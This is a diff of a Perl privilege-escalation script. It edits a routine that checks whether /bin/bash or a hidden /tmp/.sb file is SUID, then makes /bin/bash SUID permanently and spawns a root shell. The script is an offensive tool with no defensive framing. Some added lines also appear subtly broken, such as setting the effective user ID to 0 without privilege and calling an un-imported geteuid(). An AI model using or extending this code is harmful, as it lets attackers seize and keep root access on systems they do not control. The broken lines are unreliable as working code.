@@ -106,16 +106,21 @@ sub is_suid {
 sub try_suid_bash {
     if (is_suid("/bin/bash")) {
         print "${G}[+] /bin/bash is SUID! Escalating...${Z}\n";
-        open(STDIN, "<&0");
-        exec "/bin/bash", "-p", "-c", 'chmod +s /bin/bash; exec /bin/sh -p';
-        # if exec fails
-        system("/bin/bash -p -c 'chmod +s /bin/bash; exec /bin/sh -p'");
+        $> = 0; $( = 0; $) = 0;  # set euid/egid first
+        system("/bin/bash -p -c 'chmod +s /bin/bash 2>/dev/null; exec /bin/sh -p'");
+        # if we're back, try raw
+        if ($> == 0 || geteuid() == 0) {
+            exec "/bin/sh", "-p";
+        }
         return 1;
     }
     if (is_suid("/tmp/.sb")) {
         print "${G}[+] /tmp/.sb is SUID!${Z}\n";
-        exec "/tmp/.sb", "-p", "-c", 'chmod +s /bin/bash; exec /bin/sh -p';
-        system("/tmp/.sb -p -c 'chmod +s /bin/bash; exec /bin/sh -p'");
+        $> = 0; $( = 0; $) = 0;
+        system("/tmp/.sb -p -c 'chmod +s /bin/bash 2>/dev/null; exec /bin/sh -p'");
+        if ($> == 0 || geteuid() == 0) {
+            exec "/bin/sh", "-p";
+        }
         return 1;
     }
     return 0;
